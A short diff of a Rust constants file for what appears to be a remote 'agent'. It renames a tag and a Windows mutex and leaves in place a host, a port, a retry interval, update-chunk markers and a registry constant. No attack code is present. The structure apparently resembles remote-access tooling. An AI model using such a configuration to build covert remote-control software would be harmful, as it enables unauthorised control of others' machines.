@@ -1,5 +1,5 @@
 pub const VERSION: &str = "Rust-Native/1";
-pub const TAG: &str = "Valhalla";
+pub const TAG: &str = "Einherjar";
 pub const HOST: &str = "127.0.0.1";
 pub const PORT: u16 = 4793;
 pub const RETRY: u64 = 5;
@@ -38,7 +38,7 @@ pub const UPDATE_CHUNK: &str = "UPDATE_CHUNK:";
 pub const UPDATE_END: &str = "UPDATE_END:";
 
 #[cfg(windows)]
-pub const MUTEX: &str = r"\BaseNamedObjects\Valhalla.valhalla_agent";
+pub const MUTEX: &str = r"\BaseNamedObjects\Einherjar.Einherjar";
 #[cfg(windows)]
 pub const REG: &str = "reg";
 #[cfg(windows)]
